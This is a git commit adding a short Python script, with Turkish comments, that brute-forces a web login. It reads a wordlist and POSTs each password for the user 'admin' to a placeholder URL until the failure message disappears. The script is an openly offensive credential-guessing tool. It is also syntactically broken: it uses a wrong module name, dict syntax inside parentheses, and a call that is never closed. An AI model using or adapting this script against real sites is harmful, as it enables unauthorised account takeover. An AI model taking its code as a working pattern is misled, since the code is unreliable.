6b3f78e527f0d4937959f2c414ad554f13f79025
Emre Çağlar YILDIZ <emrecaglaryildiz@gmail.com>
2019-05-12 00:19:13 +0300

    basit bruteforce yazdık

---
+++ bruteForce_Ecy.py
@@ -0,0 +1,21 @@
+﻿import requests
+
+#Site url bulunduktan sonra alttaki ilgili post değerleri ve link url doldurulmalıdır.
+
+def bruteForce():
+	 
+	BASE_URL='site url girin'
+	WORDLIST= open('wordlist path yaz','r').readlines()
+
+	for lines in WORDLIST:
+
+		password=lines.strip()
+		RQ=request.post(BASE_URL, DATA=('id':'admin','sifre': password,'gonder':'submit')
+
+		if 'giris basarisiz' not in RQ.content:
+			print("sifre : "+ password)
+			break
+		else:
+			print("hatalı deneme")
+
+bruteForce()
